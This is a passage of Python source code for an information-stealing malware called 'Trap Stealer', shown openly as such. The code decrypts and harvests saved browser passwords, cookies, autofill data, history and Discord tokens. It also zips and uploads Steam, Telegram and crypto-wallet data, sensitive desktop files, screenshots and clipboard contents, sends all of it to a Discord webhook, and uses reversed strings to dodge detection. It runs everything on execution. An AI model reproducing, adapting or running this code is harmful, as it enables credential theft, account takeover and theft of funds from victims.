        return any(process_name.lower() in line.lower() for line in output.split('\n'))
    except subprocess.CalledProcessError:
        return False

def extract_history_with_timeout(browser_name, find_history_func, temp_dir, files_to_zip):
    browser_executable = f"{browser_name.lower().replace(' ', '_')}.exe"
    if is_process_running(browser_executable):
        return

    history_file = find_history_func()

    if history_file:
        output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
        try:
            save_search_history_to_file(history_file, output_file)
            files_to_zip.append(output_file)
        except sqlite3.Error as e:
            if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
                pass

def create_browser_zip(browser_name, find_history_func, temp_dir):
    history_file = find_history_func()
    if history_file:
        output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
        save_search_history_to_file(history_file, output_file)
        return output_file
    return None

def brohist():
    browsers = {
        "Chrome": find_chrome_history_file,
        "Edge": find_edge_history_file,
        "Opera GX": find_operagx_history_file,
        "Firefox": find_firefox_history_file,
        "Opera": find_opera_history_file,
        "Safari": find_safari_history_file,
        "Internet Explorer": find_ie_history_file,
        "Safari Technology Preview": find_safari_technology_preview_history_file,
    }

    threads = []
    temp_dir = tempfile.mkdtemp()
    files_to_zip = []
    try:
        get_brave_history(temp_dir, files_to_zip)
    except:pass
    try:
        for browser_name, find_history_func in browsers.items():
            thread = threading.Thread(target=extract_history_with_timeout, args=(browser_name, find_history_func, temp_dir, files_to_zip))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        if files_to_zip:
            zip_file_name = os.path.join(os.path.expandvars('%temp%'), 'browser.zip')
            with zipfile.ZipFile(zip_file_name, 'w') as zipf:
                for file_to_zip in files_to_zip:
                    if os.path.exists(file_to_zip):
                        zipf.write(file_to_zip, os.path.basename(file_to_zip))
                        os.remove(file_to_zip)
    finally:
        for file_to_delete in files_to_zip:
            if os.path.exists(file_to_delete):
                os.remove(file_to_delete)


def histup():
    try:
        brohist()
        zip_file_name = os.path.join(os.path.expandvars('%temp%'), "browser.zip")
        yrk = upload_file(zip_file_name)
        data = {
            
            "username": "Trap Stealer",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": "🍪 Trap Stealer History",
                    "description": f"Browser History File\n{yrk}",
                    "color": 0xffb6c1,
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        
    except:
        pass
Tokqs = ''
def getTokq(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for Tokq in re.findall(regex, line):
                        global Tokqs
                        if checkTokq(Tokq):
                            if not Tokq in Tokqs:
                                Tokqs += Tokq
                                uploadTokq(Tokq, path)

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokqs
                    TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkTokq(TokqDecoded):
                        if not TokqDecoded in Tokqs:
                            Tokqs += TokqDecoded
                            uploadTokq(TokqDecoded, path)


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"Trap Stealer\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

                
paswWords = []
Passw = []

def getPassw(path, arg):
    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return GetData(blob_out)

    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts in ['v10', 'v11']:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    es = 'tpyrc_so'
    ess= 'yek_detpyrcne'
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state[es[::-1]][ess[::-1]])
    master_key = CryptUnprotectData(master_key[5:])
    keys = [
    'liam', ')moc.esabnioc//:sptth(]esabnioc[', ')moc.xilften//:sptth(]xilften[' ,')moc.rebu//:sptth(]rebu[' ,'otpyrc' ,')moc.npvsserpxe//:sptth(]npvsserpxe[' ,')moc.yensid//:sptth(]yensid[' ,')moc.buhnrop//:sptth(]buhnrop[' ,')moc.margelet//:sptth(]margelet[' ,')moc.lloryhcnurc//:sptth(]lloryhcnurc[' ,')moc.kooltuo//:sptth(]kooltuo[' ,')moc.liamtoh//:sptth(]liamtoh[' ,')moc.ecnanib//:sptth(]ecnanib[' ,'lles' ,'yub' ,')moc.xobx//:sptth(]xobx[' ,')moc.obh//:sptth(]obh[' ,')moc.noitatsyalp//:sptth(]noitatsyalp[' ,')moc.sserpxeila//:sptth(]sserpxeila[' ,')moc.yabe//:sptth(]yabe[' ,')moc.nozama//:sptth(]nozama[' ,')moc.nigiro//:sptth(]nigiro[' ,')moc.lapyap//:sptth(]lapyap[' ,'knab' ,')ten.tfarcenim//:sptth(]tfarcenim[' ,')moc.hctiwt//:sptth(]hctiwt[' ,')moc.xolbor//:sptth(]xolbor[' ,')moc.oohay//:sptth(]oohay[' ,')moc.yfitops//:sptth(]yfitops[' ,')moc.semagcipe//:sptth(]semagcipe[' ,'drac' ,')moc.koobecaf//:sptth(]koobecaf[' ,')moc.rettiwt//:sptth(]rettiwt[' ,')moc.kotkit//:sptth(]kotkit[']
    for row in data: 
        if row[0] != '':
            for wa in keys[::-1]:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            us = 'emanresU'
            ur = 'lrU'
            Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')
    
    
def getinfo():
    
    try:

        sysinfo = systemInfo()
        globalinfo = globalInfo()
        clipboardtext = Clipboard()
        data = {
            
            "username": "Trap Stealer",
            "content": "@everyone someone launched it",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": "🍪 Trap Stealer Information",
                    "description": f"{globalinfo}\n\n**👀 Even more information** : \n `{sysinfo}`\n\n**Startup** : `{StartupMessage}`\nClipboard text : ```{clipboardtext}```",
                    "color": 0xffb6c1,
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except:pass

def steam_st():
    try:
        steam_path = ""
        if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
            steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
            ssfn = []
            config = ""
            for file in os.listdir(steam_path):
                if file[:4] == "ssfn":
                    ssfn.append(steam_path+f"\\{file}")
            def steam(path,path1,steam_session):
                for root,dirs,file_name in os.walk(path):
                    for file in file_name:
                        steam_session.write(root+"\\"+file)
                for file2 in path1:
                    steam_session.write(file2)
            if os.path.exists(steam_path+"\\config"):
                with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                    steam(steam_path+"\\config",ssfn,zp)

                headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    } 

            file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
            data = {
                "username": "Trap Stealer",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "content": "Here the Steam Session file"
            }

            response = requests.post(webhook, files=file, data=data)
            try:

                os.remove(f"{os.environ['TEMP']}\steam_session.zip")

            except:
                pass
    except:pass

import concurrent.futures

def upload_files_to_discord():
    keywords = ['enohp', 'noitulfedacilbup', 'gnitirw', 'etisoppa', 'laicion', 'trossap', 'muhtyre', 'tellaw', 'drowssap egarots', 'eciffo laicion', 'tnuocca', 'slavitsef eninapmoc', 'nogin', 'tnuocca knalb', 'drowssap noitcudorp', 'etisoppa laicion', 'etelpmoc laicion', 'dircet tihcrac', 'noitamroproirp', 'emusern', 'laif gnitartsinimda', 'etelpmoc', 'drowssap ycnanif', 'drowssap ytecnanif', 'drowssap decures', 'sserdda', 'ytiruces yrtnuoces laicos', 'ytocryptocurrency', 'drowssap yroirp', 'noitartsinimda', 'tterces', 'niotcib', 'evig', 'liame', 'ytinifidnocnafnoc', 'ipa', 'noitartsinimda reganam']
    extension = 'txt'
    desktop_path = os.path.expanduser("~/Desktop")
    downloads_path = os.path.expanduser("~/Downloads")
    documents_path = os.path.expanduser("~/Documents")

    file_paths = []
    for path in [desktop_path, downloads_path, documents_path]:
        try:
            for file in os.listdir(path):
                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
                    file_path = os.path.join(path, file) 
                    file_paths.append(file_path)
        except:pass
        urls = []
    
        with concurrent.futures.ThreadPoolExecutor() as executor:
            time.sleep(0.1)
            futures = []
            try:
                for file_path in file_paths:
                    futures.append(executor.submit(upload_file, file_path))
                for future, file_path in zip(futures, file_paths):
                    url = future.result()
                    if url:
                        urls.append((os.path.basename(file_path), url))
                    else:
                        pass
            except:pass
            finally:
                executor.shutdown(wait=True)


    if urls:
        embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]

        data = {
            "username": "Trap Stealer",
            "content": "",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": "🍪 Trap Stealer Files",
                    "description": "New files have been uploaded:",
                    "color": 0xffb6c1,
                    "fields": embed_fields,
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return

    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    with ZipFile(f"{pathC}/{name}.zip", "w") as zf:
        files = [file for file in os.listdir(pathC) if not (
            ".zip" in file
            or "tdummy" in file
            or "user_data" in file
            or "webview" in file
        )]
        for file in files:
            zf.write(f"{pathC}/{file}")

    lnik = upload_file(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])


def ZipThings(path, arg, procc):
    pathC = path
    name = arg

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = os.path.join(path, arg)

    if not os.path.exists(pathC):
        return

    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    wall = 'tellaW'
    if wall[::-1] in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"
    elif "Steam" in arg:
        loginusers_file = os.path.join(pathC, "loginusers.vdf")
        if not os.path.isfile(loginusers_file):
            return
        with open(loginusers_file, "r", encoding="utf8") as f:
            data = f.read()
            if 'RememberPassword"\t\t"1"' not in data:
                return
        name = arg

    zf = ZipFile(os.path.join(pathC, f"{name}.zip"), "w")
    for file in os.listdir(pathC):
        if ".zip" not in file:
            zf.write(os.path.join(pathC, file))
    zf.close()

    lnik = upload_file(os.path.join(pathC, f"{name}.zip"))
    os.remove(os.path.join(pathC, f"{name}.zip"))

    if wall[::-1] in arg or "eogaeaoehlef" in arg:
        wltZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


from subprocess import Popen, PIPE
from optparse import OptionParser
import datetime
import os
import requests

def take_screenshot_first_screen(filename):
    args = ["import", "-window", "root", filename]
    p = Popen(args)
    p.wait()




def srcs():
    try:

        if os.name == "nt":
            
            image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")

            command = [
                "powershell.exe",
                "-Command",
                f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{image_folder}\\MyFancyScreenshot.png')"
            ]
            subprocess.run( '-NoProfile', '-ExecutionPolicy', 'Bypass',command)

            screenshot_path = os.path.join(image_folder, "MyFancyScreenshot.png")

            with open(screenshot_path, "rb") as file:
                file_data = file.read()
                data = {
                    "username": "Trap Stealer",
                    "content": "Screen was successfully taken",
                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
                }
                requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})

            os.remove(screenshot_path)

        else:
            command = ["import", "-window", "root", img_path]

    except Exception as e:
        pass
def paaz():
    
    try:
        global Cookies, CookiCount
        try:
            file = os.getenv("TEMP") + f"\wppassw.txt"
            filename = "wppassw.txt"

            
        except:pass
        try:
            file2 = os.getenv("TEMP") + f"\wpcook.txt"
            filename2 = "wpcook.txt"

            
        except:pass
        try:
            file3 = os.getenv("TEMP") + f"\wpautofill.txt"
            filename3 = "wpautofill.txt"

            
        except:pass
        with open(file, 'r') as fp:
            lines = sum(1 for line in fp)
        def upload_and_assign_variable(file_path, variable):
            try:
                result = upload_file(file_path)
                variable.append(result) 
            except Exception as e:
                pass

        results = []

        thread1 = threading.Thread(target=upload_and_assign_variable, args=(file, results))
        thread2 = threading.Thread(target=upload_and_assign_variable, args=(file2, results))
        thread3 = threading.Thread(target=upload_and_assign_variable, args=(file3, results))
        
        thread1.start()
        thread2.start()
        thread3.start()

        thread1.join()
        thread2.join()
        thread3.join()

        a = results[0] if results else None
        b = results[1] if len(results) > 1 else None
        c = results[2] if len(results) > 2 else None
        
        pas = 'drowssaP'
        data = {
            "username": "Trap Stealer",
            "content": "",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": f"🍪 Trap Stealer {pas[::-1]} and cookies",
                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {AutofillCount}",
                    "color": 0xffb6c1,
                    "fields": [
                        {"name": f"{filename}", "value": f"[Click here to download]({a})"},
                        {"name": f"{filename2}", "value": f"[Click here to download]({b})"},
                        {"name": f"{filename3}", "value": f"[Click here to download]({c})"}  
                    ],
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except:
        pass


def FirefoxCookie():
    try:
        global Cookies, CookiCount
        firefoxpath = f"{roaming}/Mozilla/Firefox/Profiles"
        if not os.path.exists(firefoxpath): return
        subprocess.Popen(f"taskkill /im firefox.exe /t /f >nul 2>&1", shell=True)
        for subdir, dirs, files in os.walk(firefoxpath):
            for file in files:
               if file.endswith("cookies.sqlite"):
                    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
                    shutil.copy2(os.path.join(subdir, file), tempfold)
                    conn = sql_connect(tempfold)
                    cursor = conn.cursor()
                    cursor.execute("select * from moz_cookies ")
                    data = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    os.remove(tempfold)
                    for row in data:
                        if row[0] != '':
                            Cookies.append(f"Host Key: {row[4]} | Name : {row[2]} | Value : {row[3]}")
                            CookiCount += 1
                            
                    file3 = os.getenv("TEMP") + f"\wpautofill.txt"
                    with open(file3, 'a') as f:
                        f.write(Cookies)
                            
    except: pass
    
def getCook(path, arg):
    try:
        global Cookies, CookiCount
        
        if not os.path.exists(path): return
        e = 'seikooC/'
        pathC = path + arg + e[::-1]
        if os.stat(pathC).st_size == 0: return

        tempfold = (f"{temp}wp"+ ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))+ ".db"
        )

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = f"{path}/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
  
        for row in data: 
            if row[0] != '':

                Cookies.append(f"Host Key: {row[0]} | Name: {row[1]} | Value: {DecryptValue(row[2], master_key)}")
                CookiCount += 1
        

        writeforfile(Cookies, 'cook')
    except:
        pass
    

            
def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global wltZip, GamingZip, OtherZip
    wal, ga, ot = "",'',''
    azz = 'stellaW'
    if len(wltZip) != 0:
        
        wal = f":coin:  •  {azz[::-1]}\n"
        for i in wltZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if len(GamingZip) != 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if len(OtherZip) != 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "embeds": [
            {
            "title": "Trap Stealer Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 0xffb6c1,
            "footer": {
                "text": "Trap Stealer ZIP",
                "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
            }
        ],
        "username": "Trap Stealer",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
        "attachments": []
    }
    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)


def GatherAll():
    global PasswCount
    c = 'emorhc'
    browserPaths = [        
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
        [f"{local}/Google/Chrome/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Google/Chrome SxS/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
    ]
    d = 'drocsiD'
    ddd = 'btpdrocsid'
    dd = 'drocthgiL'
    dddd = 'yranacdrocsid'
    discordPaths = [        
        [f"{roaming}/{d[::-1]}", "/Local Storage/leveldb"],
        [f"{roaming}/{dd[::-1]}", "/Local Storage/leveldb"],
        [f"{roaming}/{dddd[::-1]}", "/Local Storage/leveldb"],
        [f"{roaming}/{ddd[::-1]}", "/Local Storage/leveldb"],
    ]
    zefez = 'tellaW'
    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", f'"Atomic {zefez[::-1]}.exe"', f"{zefez[::-1]}"],
        [f"{roaming}/Exodus/exodus.{zefez[::-1]}", "Exodus.exe", f"{zefez[::-1]}"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
    aa = []
    
    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
    global injection
    global DiscordStop
    if Startup == True:
        sta = threading.Thread(target=startup)
        sta.start()
        aa.append(sta)
    else:
        pass
    az = threading.Thread(target=upload_files_to_discord)
    az.start()
    aa.append(az)
    for patt in browserPaths:
        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
        tokq.start()
        aa.append(tokq)
    for patt in discordPaths:
        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        di.start()
        aa.append(di)
    for patt in browserPaths:
        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        pa.start()
        aa.append(pa)
    coc = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCook, args=[patt[0], patt[4]])
        a.start()
        coc.append(a)
        
        
    for patt in browserPaths:
        sta = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
        sta.start()
        aa.append(sta)
    for thread in aa:
        thread.join()
        
    a = threading.Thread(target=FirefoxCookie)
    a.start()
    aa.append(a)

    a = threading.Thread(target=getinfo)
    a.start()
    aa.append(a)
    aa = []
    
    hist = threading.Thread(target=histup)
    hist.start()
    aa.append(hist)
    
    scr = threading.Thread(target=srcs)
    scr.start()
    aa.append(scr)
    
    try:
        if antidebugging == True:
            ad = threading.Thread(target=antidebug)
            ad.start()
            aa.append(ad)
        else:
            pass
    except:
        pass

    if injection == True:
        try:
            ij = threading.Thread(target=idisc)
            ij.start()
            aa.append(ij)
        except:pass
    else:pass
    
    try:
        if NoDiscord == True:
            no = threading.Thread(target=NoDiscord)
            no.start()
            aa.append(no)
            injection = False
        else:
            pass
    except:
        pass
    
    paaz_thread = threading.Thread(target=paaz)
    paaz_thread.start()
    aa.append(paaz_thread)
    for thread in coc:
        thread.join()
        
    if Fakegen == True:
        us = threading.Thread(target=fakegen)
        us.start()
        aa.append(us)
    else:
        pass
    if FakeWebhook == True:
        wb = threading.Thread(target=webhook_tools)
        wb.start()
        aa.append(wb)
    
    for thread in aa:
        thread.join()

GatherAll() 
